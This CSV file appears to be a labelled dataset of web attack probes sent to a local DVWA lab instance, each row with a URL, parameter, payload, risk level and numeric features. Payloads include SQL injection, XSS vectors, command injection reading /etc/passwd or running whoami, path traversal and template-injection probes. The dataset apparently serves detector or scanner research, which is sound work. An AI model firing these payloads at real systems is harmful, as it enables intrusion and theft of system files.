label,url,param,payload,risk_level,v1,v2,v3,v4,v5,v6,v7,v8,v9,v10,v11,v12,v13
0,http://127.0.0.1/dvwa/logout.php,Login,"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --",high,0.0,0.0,0.0,0.0,0.9899641577060931,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_s/,btnClear,active,normal,0.0,0.0,0.0,0.0,0.9977916081108211,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/instructions.php?doc=readme,doc,test_safe_string -- ,normal,-0.002989130434782609,0.0,0.0,0.8,0.9985031977139747,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_s/,btnClear,done,normal,0.015458743224252159,0.0,0.0,0.0,0.9911345751568882,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/logout.php,Login,' AND sleep(5) --,high,0.0,0.0,0.0,0.0,0.9906810035842294,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_s/,btnClear,hello_world,normal,0.0,0.0,0.0,0.0,0.9973900823127886,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/instructions.php?doc=readme,doc,user001,normal,-0.002989130434782609,0.0,0.0,0.8,0.9985031977139747,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_s/,btnClear,inactive,normal,0.015458743224252159,0.0,0.0,0.0,0.9909353521267058,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/instructions.php?doc=readme,doc,user002,normal,-0.002989130434782609,0.0,0.0,0.8,0.9985031977139747,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/logout.php,Login,' OR 1=1 --,high,0.0,0.0,0.0,0.0,0.9842293906810036,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/instructions.php?doc=readme,doc,user003,normal,-0.002989130434782609,0.0,0.0,0.8,0.9985031977139747,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/logout.php,Login,"' UNION SELECT 1,2,3,4,5 --",high,0.032974910394265235,0.0,0.0,0.0,0.9760225669957687,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_s/,btnClear,javascript:alert(1),normal,0.0,0.0,0.0,0.0,0.9971893194137723,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/instructions.php?doc=readme,doc,user004,normal,-0.002989130434782609,0.0,0.0,0.8,0.9985031977139747,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_s/,btnClear,normaltext,normal,0.0,0.0,0.0,0.0,0.9981931339088537,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/instructions.php?doc=readme,doc,user005,normal,-0.002989130434782609,0.0,0.0,0.8,0.9985031977139747,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,"""",normal,0.0,0.0,0.0,0.0,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_s/,btnClear,ok,normal,0.0,0.0,0.0,0.0,0.9977916081108211,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/instructions.php?doc=readme,doc,{{7*7}},normal,-0.002989130434782609,0.0,0.0,0.8,0.9985031977139747,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,""" OR 1=1 --",normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_s/,btnClear,php://filter/convert.base64-encode/resource=index.php,normal,0.0,0.0,0.0,0.0,0.9981931339088537,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/instructions.php?doc=readme,doc,{{config}},normal,-0.002989130434782609,0.0,0.0,0.8,0.9985031977139747,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,${7*7},normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_s/,btnClear,random_user_name,normal,0.0,0.0,0.0,0.0,0.9975908452118049,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/logout.php,Login,"'""><script>alert(1)</script>",high,0.032974910394265235,0.0,0.0,0.0,0.9767277856135402,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/instructions.php?doc=readme,doc,| type C:\Windows\win.ini,normal,-0.002989130434782609,0.0,0.0,0.8,0.9985031977139747,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,& ping -c 1 127.0.0.1,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_s/,btnClear,ready,normal,0.0,0.0,0.0,0.0,0.9973900823127886,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/instructions.php?doc=readme,doc,| whoami,normal,-0.002989130434782609,0.0,0.0,0.8,0.9985031977139747,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,& whoami,normal,0.016652249134948095,0.0,0.0,0.0,0.9917426273458445,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_s/,btnClear,sample_input,normal,0.0,0.0,0.0,0.0,0.9987954226059025,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/instructions.php?doc=readme,doc,|| whoami,normal,-0.002989130434782609,0.0,0.0,0.8,0.9985031977139747,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/logout.php,Login,'%00,high,0.0,0.0,0.0,0.0,0.9899641577060931,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,',normal,0.0,0.0,0.0,0.0,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_s/,btnClear,test12345,normal,0.0,0.0,0.0,0.0,0.9973900823127886,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,' -- ,normal,0.016652249134948095,0.0,0.0,0.0,0.9917426273458445,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_s/,btnClear,test_safe_string,normal,0.0,0.0,0.0,0.0,0.9975908452118049,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/logout.php,Login,'%00 -- ,high,0.0,0.0,0.0,0.0,0.9899641577060931,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --",normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_s/,btnClear,test_safe_string ,normal,0.0,0.0,0.0,0.0,0.9979923710098374,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,' AND sleep(5) --,normal,0.016652249134948095,0.0,0.0,0.0,0.9917426273458445,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_s/,btnClear,test_safe_string #,normal,0.0,0.0,0.0,0.0,0.9975908452118049,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/logout.php,Login,') OR ('1'='1,high,0.0,0.0,0.0,0.0,0.989247311827957,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,' OR 1=1 --,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_s/,btnClear,test_safe_string -- ,normal,0.0,0.0,0.0,0.0,0.996988556514756,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,"' UNION SELECT 1,2,3,4,5 --",normal,0.016652249134948095,0.0,0.0,0.0,0.9917426273458445,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_s/,btnClear,user001,normal,0.0,0.0,0.0,0.0,0.9979923710098374,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/logout.php,Login,../../../../../../../../etc/passwd,high,0.0,0.0,0.0,0.0,0.989247311827957,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_s/,btnClear,user002,normal,0.0,0.0,0.0,0.0,0.9971893194137723,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_s/,btnClear,user003,normal,0.015458743224252159,0.0,0.0,0.0,0.9909353521267058,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/logout.php,Login,..\..\..\..\..\..\..\..\windows\win.ini,high,0.0,0.0,0.0,0.0,0.989247311827957,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_s/,btnClear,user004,normal,0.0,0.0,0.0,0.0,0.9975908452118049,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_s/,btnClear,user005,normal,0.015458743224252159,0.0,0.0,0.0,0.9913337981870705,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/logout.php,Login,/etc/passwd,high,0.0,0.0,0.0,0.0,0.9906810035842294,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_s/,btnClear,{{7*7}},normal,0.0,0.0,0.0,0.0,0.996988556514756,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_s/,btnClear,{{config}},normal,0.015458743224252159,0.0,0.0,0.0,0.9909353521267058,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/logout.php,Login,0,high,0.0,0.0,0.0,0.0,0.992831541218638,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_s/,btnClear,| type C:\Windows\win.ini,normal,0.0,0.0,0.0,0.0,0.9977916081108211,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_s/,btnClear,| whoami,normal,0.015458743224252159,0.0,0.0,0.0,0.9909353521267058,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/logout.php,Login,0 -- ,high,0.0,0.0,0.0,0.0,0.9906810035842294,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/xss_s/,btnClear,|| whoami,normal,0.0,0.0,0.0,0.0,0.9983938968078699,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/logout.php,Login,0%00,high,0.032974910394265235,0.0,0.0,0.0,0.9753173483779972,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/logout.php,Login,0%00%00,high,0.032974910394265235,0.0,0.0,0.0,0.9753173483779972,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/logout.php,Login,1,high,0.032974910394265235,0.0,0.0,0.0,0.9767277856135402,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/logout.php,Login,1  ,high,0.032974910394265235,0.0,0.0,0.0,0.9795486600846263,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/logout.php,Login,1 #,high,0.032974910394265235,0.0,0.0,0.0,0.9746121297602257,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/logout.php,Login,1%00,high,0.032974910394265235,0.0,0.0,0.0,0.9788434414668548,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/logout.php,Login,1' AND 1=1 #,high,0.032974910394265235,0.0,0.0,0.0,0.9739069111424542,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,"'""><script>alert(1)</script>",normal,0.0,0.0,0.005198001861572266,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,"""",normal,0.016652249134948095,0.0,0.0,0.0,0.9917426273458445,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/logout.php,Login,1' AND 1=2 #,high,0.0,0.0,0.0,0.0,0.985663082437276,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,'%00,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,""" OR 1=1 --",normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,'%00 -- ,normal,0.016652249134948095,0.0,0.0,0.0,0.9917426273458445,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,${7*7},normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/logout.php,Login,2023-10-27,high,0.0,0.0,0.0,0.0,0.9885304659498207,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,') OR ('1'='1,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,& ping -c 1 127.0.0.1,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,../../../../../../../../etc/passwd,normal,0.016652249134948095,0.0,0.0,0.0,0.9917426273458445,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,& whoami,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/logout.php,Login,; cat /etc/passwd,high,0.0,0.0,0.0,0.0,0.9899641577060931,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,..\..\..\..\..\..\..\..\windows\win.ini,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,',normal,0.0,0.0,0.0,0.0,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,/etc/passwd,normal,0.016652249134948095,0.0,0.0,0.0,0.9917426273458445,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,' -- ,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/logout.php,Login,; whoami,high,0.0,0.0,0.0,0.0,0.989247311827957,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,0,normal,0.0,0.0,0.0,0.0,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --",normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,0 -- ,normal,0.016652249134948095,0.0,0.0,0.0,0.9917426273458445,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,' AND sleep(5) --,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/logout.php,Login,<%= 7*7 %>,high,0.0,0.0,0.0,0.0,0.9906810035842294,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,0%00,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,' OR 1=1 --,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,0%00%00,normal,0.016652249134948095,0.0,0.0,0.0,0.9917426273458445,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,"' UNION SELECT 1,2,3,4,5 --",normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/logout.php,Login,<body onload=alert(1)>,high,0.0,0.0,0.0,0.0,0.989247311827957,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,1,normal,0.0,0.0,0.0,0.0,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,1  ,normal,0.016652249134948095,0.0,0.0,0.0,0.9917426273458445,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,1 #,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,1%00,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,1' AND 1=1 #,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,1' AND 1=2 #,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,2023-10-27,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,; cat /etc/passwd,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,; whoami,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,<%= 7*7 %>,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,<body onload=alert(1)>,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,"'""><script>alert(1)</script>",normal,0.0,0.0,0.0036146163940429686,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,'%00,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,'%00 -- ,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,') OR ('1'='1,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/logout.php,Login,<iframe src=javascript:alert(1)></iframe>,high,0.0,0.0,0.0027053356170654297,0.0,0.9906810035842294,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,../../../../../../../../etc/passwd,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,..\..\..\..\..\..\..\..\windows\win.ini,normal,0.016652249134948095,0.0,0.0,0.0,0.9917426273458445,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,<iframe src=javascript:alert(1)></iframe>,normal,0.0,0.0,0.010201406478881837,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/logout.php,Login,<img src=x onerror=alert(1)>,high,0.0,0.0,0.0,0.0,0.9906810035842294,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,/etc/passwd,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,0,normal,0.016652249134948095,0.0,0.0,0.0,0.9917426273458445,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,<img src=x onerror=alert(1)>,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,0 -- ,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/exec/,ip,"""",normal,0.0,0.0,0.0,0.0,0.9966658728268636,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,0%00,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/exec/,ip,""" OR 1=1 --",normal,0.0,0.0,0.0,0.0,0.9966658728268636,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,0%00%00,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/exec/,ip,${7*7},normal,0.0,0.0,0.0,0.0,0.9971421767087402,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,1,normal,0.0,0.0,0.0,0.0,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/exec/,ip,& ping -c 1 127.0.0.1,normal,0.0,0.0,0.0,0.0,0.9980947844724934,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,1  ,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/logout.php,Login,<script>alert(1)</script>,high,0.0,0.0,0.0,0.0,0.9906810035842294,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/exec/,ip,& whoami,normal,0.0,0.0,0.0,0.0,0.9969040247678018,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,<script>alert(1)</script>,normal,0.0,0.0,0.00012903213500976564,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,1 #,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/exec/,ip,',normal,0.018337699452250535,0.0,0.0,0.0,0.9892625368731564,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,1%00,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/logout.php,Login,<svg/onload=alert(1)>,high,0.0,0.0,0.0,0.0,0.9906810035842294,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/exec/,ip,' -- ,normal,0.0,0.0,0.0,0.0,0.9973803286496785,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,<svg/onload=alert(1)>,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/xss_d/,default,1' AND 1=1 #,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/exec/,ip,"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --",normal,0.018337699452250535,0.0,0.0,0.0,0.9878466076696165,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
